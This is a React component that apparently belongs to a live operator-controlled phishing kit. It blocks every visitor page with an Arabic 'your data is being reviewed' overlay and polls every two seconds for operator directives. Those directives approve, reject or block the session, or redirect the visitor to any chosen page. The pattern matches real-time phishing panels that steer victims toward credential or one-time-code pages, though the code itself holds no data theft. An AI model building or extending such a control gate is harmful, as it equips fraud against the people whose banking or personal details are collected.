import { useEffect, useState } from "react";
import { useLocation, useNavigate } from "@tanstack/react-router";
import { ackDirective, pollGate, requestApproval } from "@/lib/gate";

// Skip gating on admin surfaces and API routes.
function shouldGate(pathname: string): boolean {
  if (pathname.startsWith("/admin")) return false;
  if (pathname.startsWith("/api")) return false;
  return true;
}

export function AdminGate({ children }: { children: React.ReactNode }) {
  const location = useLocation();
  const navigate = useNavigate();
  const pathname = location.pathname;
  const gate = shouldGate(pathname);
  const [status, setStatus] = useState<"waiting" | "approved" | "rejected" | "blocked">(
    gate ? "waiting" : "approved",
  );

  useEffect(() => {
    if (!gate) {
      setStatus("approved");
      return;
    }
    let cancelled = false;
    setStatus("waiting");

    (async () => {
      await requestApproval(pathname);
    })();

    const tick = async () => {
      const s = await pollGate();
      if (cancelled || !s) return;
      if (s.state === "blocked") {
        setStatus("blocked");
        return;
      }
      const d = s.admin_directive;
      if (!d) return;
      // Consume directive.
      if (s.directive_nonce) await ackDirective(s.directive_nonce);
      if (d === "approve") {
        setStatus("approved");
      } else if (d === "reject") {
        setStatus("rejected");
      } else if (d === "block") {
        setStatus("blocked");
      } else if (d.startsWith("/")) {
        if (d !== pathname) {
          void navigate({ to: d, replace: true });
        } else {
          setStatus("approved");
        }
      }
    };

    void tick();
    const t = setInterval(tick, 2000);
    return () => {
      cancelled = true;
      clearInterval(t);
    };
  }, [pathname, gate, navigate]);

  if (!gate) return <>{children}</>;

  if (status === "approved") return <>{children}</>;

  return (
    <div
      dir="rtl"
      className="fixed inset-0 z-[9999] flex items-center justify-center bg-white/95 backdrop-blur"
    >
      <div className="max-w-sm rounded-2xl border border-gray-200 bg-white p-8 text-center shadow-2xl">
        {status === "waiting" && (
          <>
            <div className="mx-auto mb-4 h-10 w-10 animate-spin rounded-full border-4 border-gray-200 border-t-primary-600" />
            <h2 className="text-lg font-bold text-gray-900">جارٍ التحقق من طلبك</h2>
            <p className="mt-2 text-sm text-gray-600">
              يقوم فريقنا بمراجعة بياناتك للحظات، يرجى الانتظار…
            </p>
          </>
        )}
        {status === "rejected" && (
          <>
            <h2 className="text-lg font-bold text-red-600">تعذّر المتابعة</h2>
            <p className="mt-2 text-sm text-gray-600">
              يرجى مراجعة البيانات المُدخلة والمحاولة مرة أخرى.
            </p>
            <button
              onClick={() => {
                setStatus("waiting");
                void requestApproval(pathname);
              }}
              className="mt-4 rounded-lg bg-primary-600 px-4 py-2 text-sm font-medium text-white hover:bg-primary-700"
            >
              إعادة المحاولة
            </button>
          </>
        )}
        {status === "blocked" && (
          <>
            <h2 className="text-lg font-bold text-red-600">تم إيقاف الجلسة</h2>
            <p className="mt-2 text-sm text-gray-600">
              الرجاء التواصل مع الدعم لاستكمال طلبك.
            </p>
          </>
        )}
      </div>
    </div>
  );
}
